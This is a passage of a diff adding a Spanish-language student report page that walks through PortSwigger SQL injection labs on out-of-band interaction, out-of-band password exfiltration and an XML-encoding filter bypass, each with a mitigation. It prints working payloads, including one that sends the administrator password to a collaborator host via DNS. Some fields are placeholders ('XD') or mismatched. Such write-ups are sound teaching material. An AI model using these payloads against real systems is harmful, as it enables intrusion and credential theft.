+                          </li>
+                          <li>
+                            Abrir Burp Collaborator y copiar un nuevo subdominio. 
+                          </li>
+                          <li>
+                            Insertar el payload en la cookie TrackingId. 
+                          </li>
+                          <li>
+                            Enviar la petición y verificar en la pestaña de Collaborator la recepción de consultas DNS/HTTP.
+                          </li>
+                        </ol>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">Verificación</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">XD</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Explicación del payload</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <p>El payload utilizado es: '+UNION+SELECT+extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://ID.oastify.com/"> %remote;]>'),'/l')+FROM+dual--</p>
+
+                        <p>Se utiliza la función extractvalue de Oracle para forzar una solicitud externa (XXE) hacia el servidor del atacante (Burp Collaborator), confirmando la capacidad de ejecución fuera de banda.</p>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Mitigación recomendada</td>
+                    </tr>                
+                    <tr>
+                      <td colspan="2">
+                        <p>Deshabilitar funciones de red innecesarias en el motor de base de datos y emplear el principio de mínimo privilegio para el usuario de la aplicación.</p>
+                      </td>
+                    </tr>                    
+                    </tbody>
+                  </table>
+                  <a href="#indice" class="indice">Volver al índice</a>
+
+                  <table class="cronologia" id="tabla17">
+                    <thead>
+                      <tr>
+                        <th colspan="2">Lab17: Blind SQL injection with out-of-band data exfiltration</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                    <tr>
+                      <th>Nivel</th>
+                      <th>Tipo de SQLi</th>
+                    </tr>
+                    <tr>
+                      <td>Practitioner</td>
+                      <td>Blind SQL injection (Out-of-band Data Exfiltration)..</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Objetivos</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Extraer la contraseña del usuario administrator utilizando interacciones DNS externas.</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Vulnerabilidad</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <p>Similar al Lab 16, pero permite concatenar resultados de consultas (como la contraseña) dentro del subdominio solicitado al atacante.</p>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">
+                        Procedimiento
+                      </td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <p>Nota: Al requerir de la versión Professional de Burp Suite (elemento con el cual no contamos), no se pueden adjuntar las evidencias prácticas (capturas), pero si podemos explicar el procedimiento teórico.</p>
+                        <ol>
+                          <li>
+                            Generar un subdominio en Burp Collaborator.  
+                          </li>
+                          <li>
+                            Construir un payload que concatene el resultado de SELECT password FROM users con el dominio de Collaborator.  
+                          </li>
+                          <li>
+                            Inyectar en TrackingId. 
+                          </li>
+                          <li>
+                            Revisar los logs de DNS en Collaborator; el subdominio recibido contendrá la contraseña exfiltrada. 
+                          </li>
+                          <li>
+                            Autenticarse como administrador.
+                          </li>
+                        </ol>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">Verificación</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Visualización de los nombres de usuario y contraseñas renderizados en la respuesta del servidor tras el bypass exitoso.</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Explicación del payload</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <p>El payload utilizado es: '+UNION+SELECT+extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT+password+FROM+users+WHERE+username='administrator')||'.ID.oastify.com/"> %remote;]>'),'/l')+FROM+dual—</p>
+
+                        <p>El operador || concatena el secreto extraído directamente en la URL de la consulta externa, permitiendo "leer" datos en un canal que el servidor no controla.</p>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Mitigación recomendada</td>
+                    </tr>                
+                    <tr>
+                      <td colspan="2">
+                        <p>Implementar firewalls de base de datos que bloqueen tráfico saliente no autorizado y usar consultas parametrizadas.</p>
+                      </td>
+                    </tr>                    
+                    </tbody>
+                  </table>
+                  <a href="#indice" class="indice">Volver al índice</a>
+
+                  <table class="cronologia" id="tabla18">
+                    <thead>
+                      <tr>
+                        <th colspan="2">Lab18: SQL injection with filter bypass via XML encoding</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                    <tr>
+                      <th>Nivel</th>
+                      <th>Tipo de SQLi</th>
+                    </tr>
+                    <tr>
+                      <td>Practitioner</td>
+                      <td>In-band SQLi (Bypass via XML Encoding).</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Objetivos</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Obtener las credenciales de la tabla users evadiendo un filtro que bloquea palabras clave SQL.</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Vulnerabilidad</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <p>La aplicación recibe datos en formato XML. El filtro de seguridad (WAF/IPS) busca palabras como UNION o SELECT en texto plano, pero no inspecciona entidades codificadas dentro del XML.</p>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">
+                        Procedimiento
+                      </td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <p>Nota: Al requerir de la versión Professional de Burp Suite (elemento con el cual no contamos), no se pueden adjuntar las evidencias prácticas (capturas), pero si podemos explicar el procedimiento teórico.</p>
+                        <ol>
+                          <li>
+                            Localizar la petición POST que envía el stock en XML.  
+                          </li>
+                          <li>
+                            <p>Probar una inyección simple en el tag <storeId>.</p>  
+                          </li>
+                          <li>
+                            <p>Usar la extensión "Hackvertor" o un codificador manual para convertir el payload a entidades decimales/hexadecimales (ej. SELECT -> &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;).</p> 
+                          </li>
+                          <li>
+                            Enviar el payload codificado.
+                          </li>
+                        </ol>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">Verificación</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">XD</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Explicación del payload</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <p>El payload utilizado es: 1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; username, password FROM users</p>
+
+                        <p>Al codificar las palabras reservadas, el filtro de entrada las ignora por no coincidir con sus firmas de ataque, pero la base de datos las decodifica y ejecuta normalmente.</p>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Mitigación recomendada</td>
+                    </tr>                
+                    <tr>
+                      <td colspan="2">
+                        <p>Deshabilitar funciones de red innecesarias en el motor de base de datos y emplear el principio de mínimo privilegio para el usuario de la aplicación.</p>
+                      </td>
+                    </tr>                    
+                    </tbody>
+                  </table>
+                  <a href="#indice" class="indice">Volver al índice</a>
+                
+              </div>
+
+              <div class="titulo-separador"></div>
+
+              <div class="content-container">
+                <h4>Conclusiones</h4>
+                  <p>Como se pudo analizar, un ataque puede ocurrir incluso en un entorno que se considera seguro. Ninguna empresa, por más reconocida o grande que sea, está exenta de sufrir un incidente si baja la guardia en temas de seguridad. En este caso, uno de los errores más graves fue confiar completamente en un software que se creía legítimo, sin considerar que también podía ser comprometido.</p>
+                  <p>Este caso demuestra que un solo punto de confianza mal gestionado puede convertirse en una vulnerabilidad crítica para toda la organización.</p>
+              </div>
+              <a href="/assets/documentos/act01-Equipo01.pdf" download class="btn-descarga">
+                Exportar a PDF
+              </a>              
+            </div>
+      </nav>
+    </div>
+
+
+
+    <!--[if lte IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/placeholders/3.0.2/placeholders.min.js"></script><![endif]-->
+    
+    <div class="footerX">
+      <footer>Rosales Ramírez Josué Emiliano - 181760</footer>
+    </div>
+  </body>
+</html>
